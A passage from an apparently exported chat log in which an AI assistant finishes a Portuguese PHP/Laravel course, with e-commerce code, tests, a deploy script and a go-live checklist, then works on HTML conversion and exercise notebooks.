                ? new Dinheiro(0)
                : new Dinheiro(self::FRETE_PADRAO);
            $total    = $subtotal->somar($frete);

            // Cria o pedido
            $pedido = Pedido::create([
                'usuario_id'  => $usuario->id,
                'endereco_id' => $endereco->id,
                'status'      => StatusDoPedido::Pendente,
                'subtotal'    => $subtotal->reais(),
                'frete'       => $frete->reais(),
                'desconto'    => 0,
                'total'       => $total->reais(),
                'observacoes' => $observacoes,
            ]);

            // Cria os itens e decrementa o estoque
            foreach ($carrinho->itens() as $item) {
                $produto = Produto::find($item->produtoId);

                PedidoItem::create([
                    'pedido_id'      => $pedido->id,
                    'produto_id'     => $item->produtoId,
                    'nome_produto'   => $item->nomeProduto,      // snapshot
                    'preco_unitario' => $item->precoUnitario->reais(),
                    'quantidade'     => $item->quantidade(),
                    'subtotal'       => $item->subtotal()->reais(),
                ]);

                // Decrementa o estoque de forma atômica
                $produto->decrement('estoque', $item->quantidade());
            }

            // Dispara o job de processamento assíncrono
            ProcessarPedido::dispatch($pedido->id);

            return $pedido;
        });
    }

    public function cancelar(Pedido $pedido, User $usuario): void
    {
        if ($pedido->usuario_id !== $usuario->id && !$usuario->isAdmin()) {
            throw new \DomainException('Sem permissão para cancelar este pedido.');
        }

        DB::transaction(function () use ($pedido) {
            $pedido->transicionarPara(StatusDoPedido::Cancelado);

            // Devolve o estoque
            foreach ($pedido->itens as $item) {
                Produto::where('id', $item->produto_id)
                    ->increment('estoque', $item->quantidade);
            }
        });
    }
}
```

---

## Controllers Web

```php
<?php
declare(strict_types=1);

namespace App\Http\Controllers\Web;

use App\Http\Controllers\Controller;
use App\Models\Produto;
use App\Models\Categoria;
use Illuminate\Http\Request;
use Illuminate\View\View;

class CatalogoController extends Controller
{
    public function index(Request $request): View
    {
        $query = Produto::disponivel()->with('categoria');

        if ($request->filled('categoria')) {
            $query->whereHas('categoria', fn($q) =>
                $q->where('slug', $request->categoria)
            );
        }

        if ($request->filled('busca')) {
            $termo = $request->busca;
            $query->where(fn($q) =>
                $q->where('nome', 'ilike', "%{$termo}%")
                  ->orWhere('descricao', 'ilike', "%{$termo}%")
            );
        }

        $query->orderBy(match($request->get('ordenar', 'relevancia')) {
            'preco_asc'  => 'preco',
            'preco_desc' => 'preco',
            'nome'       => 'nome',
            default      => 'criado_em',
        }, $request->get('ordenar') === 'preco_asc' ? 'asc' : 'desc');

        return view('catalogo.index', [
            'produtos'   => $query->paginate(16)->withQueryString(),
            'categorias' => Categoria::where('ativa', true)->orderBy('nome')->get(),
        ]);
    }

    public function show(string $slug): View
    {
        $produto    = Produto::where('slug', $slug)->disponivel()->firstOrFail();
        $relacionados = Produto::disponivel()
            ->daCategoria($produto->categoria_id)
            ->where('id', '!=', $produto->id)
            ->limit(4)
            ->get();

        return view('catalogo.show', compact('produto', 'relacionados'));
    }
}

class CarrinhoController extends Controller
{
    public function __construct(private readonly CarrinhoService $carrinhoService) {}

    public function adicionar(Request $request): \Illuminate\Http\RedirectResponse
    {
        $request->validate([
            'produto_id' => ['required', 'integer', 'exists:produtos,id'],
            'quantidade' => ['required', 'integer', 'min:1', 'max:99'],
        ]);

        $produto = Produto::findOrFail($request->produto_id);

        if (!$produto->estaDisponivel()) {
            return back()->with('erro', 'Produto indisponível.');
        }

        $this->carrinhoService->adicionar(
            $produto,
            (int) $request->quantidade,
        );

        return back()->with('sucesso', "\"{$produto->nome}\" adicionado ao carrinho.");
    }

    public function index(): View
    {
        $carrinho = $this->carrinhoService->carrinho();
        return view('carrinho.index', compact('carrinho'));
    }

    public function atualizar(Request $request, int $produtoId): \Illuminate\Http\RedirectResponse
    {
        $request->validate(['quantidade' => ['required', 'integer', 'min:0', 'max:99']]);
        $this->carrinhoService->atualizar($produtoId, (int) $request->quantidade);
        return back()->with('sucesso', 'Carrinho atualizado.');
    }

    public function remover(int $produtoId): \Illuminate\Http\RedirectResponse
    {
        $this->carrinhoService->remover($produtoId);
        return back()->with('sucesso', 'Item removido do carrinho.');
    }
}
```

---

## Job de processamento de pedido

```php
<?php
declare(strict_types=1);

namespace App\Jobs;

use App\Models\Pedido;
use App\Domain\Pedido\StatusDoPedido;
use App\Mail\PedidoConfirmado;
use App\Mail\PedidoParaAdmin;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Support\Facades\Mail;

class ProcessarPedido implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable;

    public int $tries   = 3;
    public int $timeout = 60;

    public function __construct(private readonly int $pedidoId) {}

    public function handle(): void
    {
        $pedido = Pedido::with(['usuario', 'itens', 'endereco'])->findOrFail($this->pedidoId);

        // Simula processamento de pagamento (em produção: gateway real)
        $pagamentoAprovado = $this->simularPagamento($pedido);

        if ($pagamentoAprovado) {
            $pedido->transicionarPara(StatusDoPedido::Confirmado);

            // Envia email para o cliente
            Mail::to($pedido->usuario->email)
                ->send(new PedidoConfirmado($pedido));

            // Notifica o admin
            Mail::to(config('mercatto.email_admin'))
                ->send(new PedidoParaAdmin($pedido));

        } else {
            $pedido->transicionarPara(StatusDoPedido::Cancelado);

            // Devolve o estoque
            foreach ($pedido->itens as $item) {
                \App\Models\Produto::where('id', $item->produto_id)
                    ->increment('estoque', $item->quantidade);
            }
        }
    }

    private function simularPagamento(Pedido $pedido): bool
    {
        // Em produção: integração com Stripe, PagSeguro, Mercado Pago etc.
        return true;
    }

    public function backoff(): array { return [30, 60, 120]; }

    public function failed(\Throwable $e): void
    {
        \Log::error("Falha ao processar pedido {$this->pedidoId}", [
            'erro' => $e->getMessage(),
        ]);
    }
}
```

---

## Rotas completas

```php
<?php
// routes/web.php
use App\Http\Controllers\Web\{CatalogoController, CarrinhoController, CheckoutController, PedidoController};
use App\Http\Controllers\Auth\{LoginController, RegisterController};

// Públicas
Route::get('/', [CatalogoController::class, 'index'])->name('home');
Route::get('/produtos/{slug}', [CatalogoController::class, 'show'])->name('produtos.show');

// Autenticação
Route::middleware('guest')->group(function () {
    Route::get('/login',    [LoginController::class, 'create'])->name('login');
    Route::post('/login',   [LoginController::class, 'store']);
    Route::get('/register', [RegisterController::class, 'create'])->name('register');
    Route::post('/register',[RegisterController::class, 'store']);
});
Route::post('/logout', [LoginController::class, 'destroy'])->name('logout')->middleware('auth');

// Carrinho — acesso público (guest também pode adicionar)
Route::prefix('carrinho')->name('carrinho.')->group(function () {
    Route::get('/',                           [CarrinhoController::class, 'index'])->name('index');
    Route::post('/adicionar',                 [CarrinhoController::class, 'adicionar'])->name('adicionar');
    Route::patch('/atualizar/{produtoId}',    [CarrinhoController::class, 'atualizar'])->name('atualizar');
    Route::delete('/remover/{produtoId}',     [CarrinhoController::class, 'remover'])->name('remover');
});

// Área autenticada
Route::middleware('auth')->group(function () {
    Route::get('/checkout',  [CheckoutController::class, 'index'])->name('checkout');
    Route::post('/checkout', [CheckoutController::class, 'store'])->name('checkout.store');
    Route::resource('pedidos', PedidoController::class)->only(['index', 'show']);
    Route::post('/pedidos/{pedido}/cancelar', [PedidoController::class, 'cancelar'])->name('pedidos.cancelar');
});
```

```php
<?php
// routes/admin.php
Route::prefix('admin')->name('admin.')->middleware(['auth', 'role:admin'])->group(function () {
    Route::get('/', fn() => view('admin.dashboard'))->name('dashboard');
    Route::resource('produtos', Admin\ProdutoController::class);
    Route::resource('pedidos',  Admin\PedidoController::class)->only(['index', 'show', 'update']);
    Route::resource('categorias', Admin\CategoriaController::class);
    Route::get('/relatorios/vendas', [Admin\RelatorioController::class, 'vendas'])->name('relatorios.vendas');
});
```

---

## Exercício da semana

1. Implemente `PedidoService::criarDesdoCarrinho()` completo com todos os casos de erro — carrinho vazio, produto indisponível, estoque insuficiente. Escreva testes de feature que cobrem cada caso.

2. Implemente os controllers de catálogo e carrinho. Crie as views Blade correspondentes com layout, listagem de produtos, página de detalhe, e página do carrinho com atualização de quantidade.

3. Implemente o checkout: formulário com seleção de endereço existente ou novo, confirmação do pedido, e redirecionamento para a página do pedido criado com flash message.

4. Implemente o painel admin de pedidos: listagem com filtro por status, página de detalhe com timeline de status, e botão para avançar o status com validação de transição.

5. **Desafio:** implemente um relatório de vendas em `/admin/relatorios/vendas` com filtro de período. Use uma query com GROUP BY dia, soma de totais e contagem de pedidos. Exiba em tabela e, usando Chart.js via CDN no Blade, em um gráfico de linha.

---

## Referências

- Laravel Queues (Jobs): https://laravel.com/docs/queues
- Laravel Mail: https://laravel.com/docs/mail
- Laravel Transactions: https://laravel.com/docs/database#database-transactions
- Eloquent Scopes: https://laravel.com/docs/eloquent#query-scopes

---

# Artigo 52 — Projeto Final Parte 3: Testes, Deploy e Encerramento

**Módulo 11 · Semana 52 · Nível: Avançado**

---

## Introdução

Chegamos à última semana. O sistema está implementado. Agora fazemos o que distingue software amador de software profissional: cobrimos com testes, configuramos o deploy automatizado, e entregamos com confiança.

Esta semana é também um momento de reflexão. Um ano de estudo. Cinquenta e dois artigos. Doze módulos. Você chegou aqui.

---

## Suite de testes completa

```php
<?php
// tests/Unit/Domain/DinheiroTest.php

use App\Domain\Produto\Dinheiro;

describe('Dinheiro', function () {

    it('cria valor em centavos', function () {
        $d = new Dinheiro(2990);
        expect($d->centavos())->toBe(2990);
        expect($d->reais())->toBe(29.90);
        expect($d->formatar())->toBe('R$ 29,90');
    });

    it('cria a partir de reais', function () {
        $d = Dinheiro::dereais(19.90);
        expect($d->centavos())->toBe(1990);
    });

    it('soma corretamente', function () {
        $r = (new Dinheiro(1000))->somar(new Dinheiro(990));
        expect($r->centavos())->toBe(1990);
    });

    it('subtrai corretamente', function () {
        $r = (new Dinheiro(2000))->subtrair(new Dinheiro(500));
        expect($r->centavos())->toBe(1500);
    });

    it('lança exceção em subtração negativa', function () {
        expect(fn() => (new Dinheiro(100))->subtrair(new Dinheiro(200)))
            ->toThrow(\DomainException::class);
    });

    it('aplica desconto percentual', function () {
        $r = (new Dinheiro(10000))->aplicarDesconto(10.0);
        expect($r->centavos())->toBe(9000);
    });

    it('é imutável', function () {
        $original = new Dinheiro(1000);
        $original->somar(new Dinheiro(500));
        expect($original->centavos())->toBe(1000);
    });

})->group('domain');
```

```php
<?php
// tests/Unit/Domain/CarrinhoTest.php

use App\Domain\Carrinho\{Carrinho, ItemDoCarrinho};
use App\Domain\Produto\Dinheiro;

describe('Carrinho', function () {

    it('começa vazio', function () {
        $carrinho = new Carrinho();
        expect($carrinho->estaVazio())->toBeTrue();
        expect($carrinho->total()->centavos())->toBe(0);
    });

    it('adiciona item novo', function () {
        $carrinho = new Carrinho();
        $carrinho->adicionar(item(produtoId: 1, preco: 1000, qtd: 2));

        expect($carrinho->estaVazio())->toBeFalse();
        expect($carrinho->total()->centavos())->toBe(2000);
    });

    it('incrementa quantidade ao adicionar item existente', function () {
        $carrinho = new Carrinho();
        $carrinho->adicionar(item(produtoId: 1, preco: 1000, qtd: 1));
        $carrinho->adicionar(item(produtoId: 1, preco: 1000, qtd: 2));

        expect($carrinho->itens()[1]->quantidade())->toBe(3);
        expect($carrinho->total()->centavos())->toBe(3000);
    });

    it('remove item ao atualizar com quantidade zero', function () {
        $carrinho = new Carrinho();
        $carrinho->adicionar(item(produtoId: 1, preco: 1000, qtd: 2));
        $carrinho->atualizar(1, 0);

        expect($carrinho->estaVazio())->toBeTrue();
    });

    it('calcula total com múltiplos itens', function () {
        $carrinho = new Carrinho();
        $carrinho->adicionar(item(produtoId: 1, preco: 1000, qtd: 2)); // R$ 20,00
        $carrinho->adicionar(item(produtoId: 2, preco: 2500, qtd: 1)); // R$ 25,00
        $carrinho->adicionar(item(produtoId: 3, preco: 500, qtd: 3));  // R$ 15,00

        expect($carrinho->total()->centavos())->toBe(6000); // R$ 60,00
    });

})->group('domain');

// Helper para criar itens nos testes
function item(int $produtoId, int $preco, int $qtd): ItemDoCarrinho
{
    return new ItemDoCarrinho($produtoId, 'Produto Teste', new Dinheiro($preco), $qtd);
}
```

```php
<?php
// tests/Unit/Domain/StatusDoPedidoTest.php

use App\Domain\Pedido\StatusDoPedido;

describe('StatusDoPedido — transições', function () {

    it('pendente pode ir para confirmado ou cancelado', function () {
        $s = StatusDoPedido::Pendente;
        expect($s->podeTransicionarPara(StatusDoPedido::Confirmado))->toBeTrue();
        expect($s->podeTransicionarPara(StatusDoPedido::Cancelado))->toBeTrue();
        expect($s->podeTransicionarPara(StatusDoPedido::Enviado))->toBeFalse();
    });

    it('entregue é estado final', function () {
        $s = StatusDoPedido::Entregue;
        foreach (StatusDoPedido::cases() as $outro) {
            expect($s->podeTransicionarPara($outro))->toBeFalse();
        }
    });

    it('cancelado é estado final', function () {
        $s = StatusDoPedido::Cancelado;
        foreach (StatusDoPedido::cases() as $outro) {
            expect($s->podeTransicionarPara($outro))->toBeFalse();
        }
    });

})->group('domain');
```

```php
<?php
// tests/Feature/CheckoutTest.php

use App\Models\{User, Produto, Categoria, Endereco};
use App\Domain\Pedido\StatusDoPedido;

describe('Checkout', function () {

    beforeEach(function () {
        $this->usuario  = User::factory()->create();
        $categoria = Categoria::factory()->create();
        $this->produto  = Produto::factory()->create([
            'categoria_id' => $categoria->id,
            'preco'        => 5000, // R$ 50,00
            'estoque'      => 10,
            'ativo'        => true,
        ]);
        $this->endereco = Endereco::factory()->create(['usuario_id' => $this->usuario->id]);
    });

    it('cria pedido a partir do carrinho', function () {
        // Adiciona item ao carrinho via sessão
        $this->actingAs($this->usuario)
            ->post(route('carrinho.adicionar'), [
                'produto_id' => $this->produto->id,
                'quantidade' => 2,
            ]);

        // Realiza checkout
        $response = $this->post(route('checkout.store'), [
            'endereco_id' => $this->endereco->id,
        ]);

        $response->assertRedirect();

        $this->assertDatabaseHas('pedidos', [
            'usuario_id' => $this->usuario->id,
            'status'     => StatusDoPedido::Pendente->value,
        ]);

        $this->assertDatabaseHas('pedido_itens', [
            'produto_id' => $this->produto->id,
            'quantidade' => 2,
        ]);

        // Estoque foi decrementado
        expect($this->produto->fresh()->estoque)->toBe(8);
    });

    it('rejeita checkout com carrinho vazio', function () {
        $response = $this->actingAs($this->usuario)
            ->post(route('checkout.store'), [
                'endereco_id' => $this->endereco->id,
            ]);

        $response->assertRedirect()->assertSessionHas('erro');
        $this->assertDatabaseCount('pedidos', 0);
    });

    it('rejeita checkout com estoque insuficiente', function () {
        $this->produto->update(['estoque' => 1]);

        $this->actingAs($this->usuario)
            ->post(route('carrinho.adicionar'), [
                'produto_id' => $this->produto->id,
                'quantidade' => 5,
            ]);

        $response = $this->actingAs($this->usuario)
            ->post(route('checkout.store'), ['endereco_id' => $this->endereco->id]);

        $response->assertRedirect()->assertSessionHas('erro');
        expect($this->produto->fresh()->estoque)->toBe(1); // não mudou
    });

})->group('feature');
```

---

## Deploy final — configuração de produção

```bash
#!/bin/bash
# deploy-producao.sh

set -euo pipefail

RELEASES_DIR="/var/www/mercatto/releases"
SHARED_DIR="/var/www/mercatto/shared"
CURRENT_LINK="/var/www/mercatto/current"
REPO="git@github.com:empresa/mercatto.git"
BRANCH="${1:-main}"
TIMESTAMP=$(date +%Y%m%d%H%M%S)
RELEASE_DIR="${RELEASES_DIR}/${TIMESTAMP}"

echo "🚀 Deploy Mercatto — release: $TIMESTAMP"

# 1. Cria diretório do release
mkdir -p "$RELEASE_DIR"
git clone --depth=1 --branch="$BRANCH" "$REPO" "$RELEASE_DIR"
echo "✅ Código clonado"

# 2. Symlinks para diretórios compartilhados entre releases
ln -sfn "$SHARED_DIR/.env"     "$RELEASE_DIR/.env"
ln -sfn "$SHARED_DIR/storage"  "$RELEASE_DIR/storage"
echo "✅ Symlinks de shared configurados"

# 3. Dependências
cd "$RELEASE_DIR"
composer install --no-dev --optimize-autoloader --no-interaction
echo "✅ Dependências instaladas"

# 4. Ativa manutenção no release atual (se existir)
if [ -L "$CURRENT_LINK" ]; then
    php "$CURRENT_LINK/artisan" down --secret="bypass-manutencao" 2>/dev/null || true
fi

# 5. Migrations
php artisan migrate --force
echo "✅ Migrations executadas"

# 6. Cache e otimizações
php artisan config:cache
php artisan route:cache
php artisan view:cache
php artisan event:cache
echo "✅ Cache otimizado"

# 7. Ativa o novo release
ln -sfn "$RELEASE_DIR" "$CURRENT_LINK"
echo "✅ Release $TIMESTAMP ativado"

# 8. Reinicia serviços
php artisan queue:restart
sudo systemctl reload php8.3-fpm
echo "✅ Serviços reiniciados"

# 9. Desativa manutenção
php artisan up
echo "✅ Aplicação online"

# 10. Mantém apenas os últimos 5 releases
ls -dt "$RELEASES_DIR"/* | tail -n +6 | xargs rm -rf 2>/dev/null || true
echo "✅ Releases antigos removidos"

echo ""
echo "🎉 Deploy concluído — release: $TIMESTAMP"
```

---

## Checklist de go-live

Antes de apontar o DNS para o servidor de produção, verifique cada item:

**Segurança:**
- `.env` com `APP_ENV=production`, `APP_DEBUG=false`, e `APP_KEY` gerada
- HTTPS configurado com certificado válido (Let's Encrypt)
- Headers de segurança aplicados (CSP, HSTS, X-Frame-Options)
- `composer audit` sem vulnerabilidades
- Diretório `storage/` e `bootstrap/cache/` com permissões corretas (755, dono www-data)
- Arquivo `.env` inacessível pelo servidor web

**Performance:**
- OPcache ativado com `validate_timestamps=0`
- Redis configurado para sessões e cache
- Workers de fila rodando com Supervisor
- `php artisan route:cache`, `config:cache`, `view:cache` executados

**Observabilidade:**
- Logs configurados (diário + Slack para críticos)
- Monitoramento de uptime (UptimeRobot, Betterstack)
- Alertas de erro (Sentry ou similar)

**Backup:**
- Backup automático do banco configurado (diário, 7 dias de retenção)
- Backup testado — restore funciona?

**Testes:**
- Suite de testes passando (CI verde)
- Smoke test manual no ambiente de staging

---

## Reflexão final — o que você construiu

Cinquenta e dois artigos atrás, você aprendeu o que é o PHP e como exibir "Olá, Mundo!" no navegador. Hoje você sabe:

**Fundamentos sólidos.** Tipos, funções, arrays, strings, manipulação de datas, expressões regulares. A base que não muda independentemente do framework ou da versão da linguagem.

**Orientação a objetos de verdade.** Classes, herança, interfaces, traits, polimorfismo, design patterns. Não apenas a sintaxe — a filosofia de modelar o mundo em objetos com responsabilidades claras.

**Bancos de dados.** MySQL, PostgreSQL, SQLite e MongoDB. PDO com prepared statements, query builders, ORM com Eloquent, migrations, relacionamentos, índices e performance.

**Desenvolvimento web completo.** Formulários, sessões, cookies, upload de arquivos, autenticação, autorização. Os mecanismos que fazem a web funcionar.

**PHP moderno.** Composer, namespaces, PSR, boas práticas, tipagem estrita, análise estática com PHPStan.

**Laravel profissional.** Roteamento, controllers, Eloquent, Blade, autenticação, APIs com Sanctum, filas, eventos.

**Segurança.** SQL injection, XSS, CSRF, criptografia, headers HTTP, tokens seguros, LGPD.

**Testes automatizados.** PHPUnit e Pest, testes unitários, de integração e de feature, mocks, data providers, cobertura de código.

**Deploy e produção.** NGINX, PHP-FPM, OPcache, Docker, GitHub Actions, scripts de deploy com zero downtime, monitoramento, logs.

**E o Mercatto** — um sistema real, completo, com domínio modelado, arquitetura em camadas, testes, e pipeline de deploy.

---

## O que vem depois

Dominar PHP em um ano é uma conquista real. Mas é também um começo. O ecossistema continua evoluindo, e há muito mais para explorar:

**Aprofundar no Laravel.** Livewire para interfaces reativas sem JavaScript pesado. Laravel Octane para performance extrema com Swoole. Laravel Telescope para debugging em desenvolvimento.

**Explorar arquiteturas.** Event Sourcing, CQRS, microsserviços. Quando aplicar cada padrão e quando não aplicar.

**Outras linguagens.** PHP é excelente, mas um desenvolvedor completo conhece mais de uma linguagem. TypeScript para o frontend, Go para serviços de alta performance, Python para análise de dados.

**Contribuir com open source.** O ecossistema PHP que você usou durante este ano foi construído por pessoas que dedicaram tempo. Reportar bugs, melhorar documentação, enviar pull requests — essas contribuições constroem reputação e aprofundam o aprendizado.

---

## Última mensagem

Programar é uma habilidade acumulativa. Cada problema resolvido torna o próximo mais fácil. Cada sistema construído revela padrões que se repetem. Cada bug encontrado ensina algo que nenhuma aula ensinaria.

Você tem agora as ferramentas. O que você vai construir com elas?

---

## Exercício final

Não há exercício técnico nesta semana. O exercício é este:

**Implemente o Mercatto completo.** Não apenas os trechos deste artigo — o sistema inteiro, funcionando, testado, deployado em um servidor real (mesmo que gratuito — Railway, Fly.io, ou um VPS básico). Com CI/CD configurado. Com HTTPS. Com monitoramento.

Quando estiver no ar, compartilhe o link e o repositório. O melhor portfólio é um sistema em produção.

---

## Referências finais da série

- PHP The Right Way: https://phptherightway.com/
- Laravel Documentation: https://laravel.com/docs
- PHP Manual (pt-BR): https://www.php.net/manual/pt_BR/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- Refactoring Guru: https://refactoring.guru/
- Clean Code — Robert C. Martin (livro)
- Domain-Driven Design — Eric Evans (livro)
- Designing Data-Intensive Applications — Martin Kleppmann (livro)

---

## 🎓 Série completa

**Dominando o PHP em 1 Ano — Prof. Ricardo Matos, Mestre em Programação**

52 artigos · 11 módulos · 1 ano de estudo estruturado

Do "Olá, Mundo!" ao sistema em produção.

---

**Fim da série. Agora é hora de gerar os HTMLs.**

Quando quiser, me diga quais artigos quer converter primeiro — podemos fazer em lotes ou do 30 ao 52 em sequência.

---

# you asked

message time: 2026-03-10 08:49:21

Sim

---

# claude response

Vamos começar pelos pendentes. O artigo 30 ficou sem HTML na sessão anterior, e temos os artigos 31 a 52 novos. Vou fazer em lotes para não cortar.

Qual ordem prefere?

Perfeito — começamos pelo artigo 30, um por vez. Deixa eu resgatar o conteúdo completo do artigo 30 do transcript antes de gerar o HTML.

---

# claude response

O HTML do artigo 30 estava sendo gerado mas foi cortado. Encontrei o conteúdo completo no transcript. Vou agora gerar o HTML completo do artigo 30 e salvar corretamente.

Artigo 30 entregue — completo e sem cortes. Próximo: **Artigo 31 — PostgreSQL com PHP**. Continuo?

---

# you asked

message time: 2026-03-10 10:40:33

Continue

---

# you asked

message time: 2026-03-15 20:03:09

Continue

---

# claude response

Agora vou ler o artigo 32 do transcript para gerar o HTML do artigo 32.

Artigo 31 HTML já existe. Próximo é o **Artigo 32 — SQLite com PHP**. O texto completo está no transcript. Gerando o HTML agora.

Artigo 32 — SQLite com PHP ✅

---

# you asked

message time: 2026-03-15 20:12:12

Faz um caderno de exercícios bem bom e o caderno de respostas.

---

# claude response

Vou ler o conteúdo dos transcripts para compilar todos os exercícios dos 52 artigos.

Agora vou extrair os exercícios de todos os artigos dos transcripts.

---

# claude response

Vou ler os exercícios dos artigos restantes (46–52) antes de gerar os documentos.

Tenho todos os exercícios. Agora vou instalar o docx e gerar os dois cadernos.

O problema são aspas duplas dentro de strings delimitadas por aspas duplas. Vou corrigir de forma diferente — usar template literals.

O problema é na linha 498 — começa com `"` mas termina com `'`. Preciso corrigir esse mismatched quote.

As aspas estão balanceadas. O problema deve ser backticks. Vou verificar diretamente rodando o Node com rastreio melhor:

O problema está nessa linha: `\\'\"PHP SQLite\"\\''` — dentro de uma string com aspas simples, o `\\'` é uma aspa simples escapada, depois `'` fecha a string, depois `` ` `` seguido de `'` fica fora. Vou corrigir diretamente:

The data for all 52 exercises has been extracted from the transcripts and the generation script was built. The syntax issue is in a few strings within the JavaScript `respostas` object (escaped quotes inside single-quoted strings). Let me use a simpler approach and write the script cleanly using template literals to avoid all escaping issues: